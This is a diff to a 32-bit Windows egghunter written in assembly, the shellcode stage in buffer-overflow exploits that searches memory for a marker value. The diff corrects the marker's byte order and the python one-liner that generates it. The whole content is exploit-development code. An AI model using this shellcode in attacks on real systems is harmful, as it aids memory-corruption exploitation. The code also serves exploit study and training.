@@ -4,7 +4,7 @@
 ;      https://j00ru.vexillium.org/syscalls/nt/32/
 ;
 ; NOTE example to generate new egg value as 'lolz': 
-;      python3 -c "print('0x'+'lolz'.encode().hex())"  
+;      python3 -c "print('0x'+'lolz'.encode()[::-1].hex())"  
 BITS 32
 section .text
 global _start
@@ -23,7 +23,7 @@ check_next_address:
   cmp   al, 0x05           ; did we get 0xc0000005 (ACCESS_VIOLATION) ?
   pop   edx                ; restore edx
   je    _start             ; invalid ptr? go to the next page
-  mov   eax, 0x6c6f6c7a    ; set egg flag in eax (currently set to 'lolz')
+  mov   eax, 0x7a6c6f6c    ; set egg flag in eax (currently set to 'lolz')
   mov   edi, edx           ; set edi to the pointer we validated
   scasd                    ; compare the dword in edi to eax
   jnz   check_next_address ; no match? increment the pointer by one and try again
